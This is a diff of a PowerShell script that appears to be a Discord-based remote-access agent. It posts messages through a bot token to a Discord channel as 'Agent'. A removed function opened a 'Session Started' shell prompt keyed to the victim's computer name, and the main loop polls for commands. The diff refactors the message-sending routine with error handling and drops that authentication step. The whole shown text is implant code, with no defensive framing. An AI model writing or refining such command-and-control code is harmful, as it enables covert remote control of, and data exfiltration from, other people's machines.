@@ -77,32 +77,31 @@ function PullMsg {
 
 function sendMsg {
     param([string]$Message)
-    $dir = $PWD.Path
+
     $url = "https://discord.com/api/v9/channels/$chan/messages"
+
     $webClient = New-Object System.Net.WebClient
     $webClient.Headers.Add("Authorization", "Bot $token")
+    $webClient.Headers.Add("Content-Type", "application/json")
+    $webClient.Encoding = [System.Text.Encoding]::UTF8
+
     if ($Message) {
-            $jsonBody = @{
-                "content" = "$Message"
-                "username" = "Agent"
-            } | ConvertTo-Json
-            $webClient.Headers.Add("Content-Type", "application/json")
+        $jsonBody = @{
+            "content" = $Message
+            "username" = "Agent"
+        } | ConvertTo-Json
+
+        try {
             $response = $webClient.UploadString($url, "POST", $jsonBody)
             Write-Host "Message sent to Discord"
         }
+        catch {
+            Write-Host "[ERROR] Discord API error:"
+            Write-Host $_.Exception.Response.StatusCode.value__
+            Write-Host $_.Exception.Message
+            Write-Host $_.Exception.Response.GetResponseStream()
+        }
     }
-
-Function Authenticate{
-    if ($response -like "$env:COMPUTERNAME"){
-        $script:authenticated = 1
-        $script:previouscmd = $response
-        sendMsg -Message ":white_check_mark:  **$env:COMPUTERNAME** | ``Session Started!``  :white_check_mark:"
-        sendMsg -Message "``PS | $dir>``"
-    }
-    else{
-        $script:authenticated = 0
-        $script:previouscmd = $response
-    } 
 }
 
 # =============================================================== MAIN LOOP =========================================================================
@@ -167,4 +166,5 @@ while ($true) {
     }
     sleep 5
 }
+
 
